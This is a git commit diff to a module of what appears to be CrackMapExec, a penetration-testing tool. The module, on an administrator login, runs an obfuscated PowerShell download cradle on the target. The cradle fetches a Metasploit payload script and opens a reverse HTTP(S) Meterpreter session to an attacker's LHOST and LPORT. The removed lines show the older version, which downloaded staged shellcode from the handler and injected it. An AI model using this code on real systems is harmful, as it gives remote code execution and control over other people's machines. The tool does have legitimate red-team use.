73fb33604034eaa3a9ae8555abaf3028a1690c64
mpgn <martial.puygrenier@gmail.com>
2020-05-01 13:12:01 -0400

    Update module metasploit #357
    As the old code with the shellcode was broken, we switch to a simple powershell solution with Invoke-MetasploitPayload.ps1

--- cme/modules/met_inject.py
+++ cme/modules/met_inject.py
@@ -16,57 +16,37 @@ class CMEModule:
         '''
             LHOST    IP hosting the handler
             LPORT    Handler port
+            RAND     Random string given by metasploit
             PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)
-            PROCID   Process ID to inject into (default: current powershell process)
         '''
 
         self.met_payload = 'reverse_https'
         self.procid = None
 
-        if not 'LHOST' in module_options or not 'LPORT' in module_options:
-            context.log.error('LHOST and LPORT options are required!')
+        if not 'LHOST' in module_options or not 'LPORT' in module_options or not 'RAND' in module_options:
+            context.log.error('LHOST and LPORT  and RAND options are required!')
             exit(1)
 
         if 'PAYLOAD' in module_options:
             self.met_payload = module_options['PAYLOAD']
 
-        if 'PROCID' in module_options:
-            self.procid = module_options['PROCID']
-
         self.lhost = module_options['LHOST']
         self.lport = module_options['LPORT']
+        self.rand = module_options['RAND']
 
-        self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-Shellcode.ps1')
+        self.ps_script = obfs_ps_script('Invoke-MetasploitPayload/Invoke-MetasploitPayload.ps1')
 
     def on_admin_login(self, context, connection):
-        #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
-        #so now we have to manually generate a valid Meterpreter request URL and download + exec the staged shellcode
-
-        payload = """$CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}
-        $SumTest = $False
-        while ($SumTest -eq $False)
-        {{
-            $GeneratedUri = $CharArray | Get-Random -Count 4
-            $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
-        }}
-        $RequestUri = -join $GeneratedUri
-        $Request = "{}://{}:{}/$($RequestUri)"
-        $WebClient = New-Object System.Net.WebClient
-        [Byte[]]$bytes = $WebClient.DownloadData($Request)
-        Invoke-Shellcode -Force -Shellcode $bytes""".format('http' if self.met_payload == 'reverse_http' else 'https',
+        payload = """Invoke-MetasploitPayload {}://{}:{}/{}""".format('http' if self.met_payload == 'reverse_http' else 'https',
                                                             self.lhost,
-                                                            self.lport)
-
-        if self.procid:
-            payload += " -ProcessID {}".format(self.procid)
-
-        launcher = gen_ps_iex_cradle(context, 'Invoke-Shellcode.ps1', payload, post_back=False)
-
+                                                            self.lport,
+                                                            self.rand)
+        launcher = gen_ps_iex_cradle(context, 'Invoke-MetasploitPayload.ps1', payload, post_back=False)
         connection.ps_execute(launcher, force_ps32=True)
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
-        if 'Invoke-Shellcode.ps1' == request.path[1:]:
+        if 'Invoke-MetasploitPayload.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
             request.wfile.write(self.ps_script.encode())
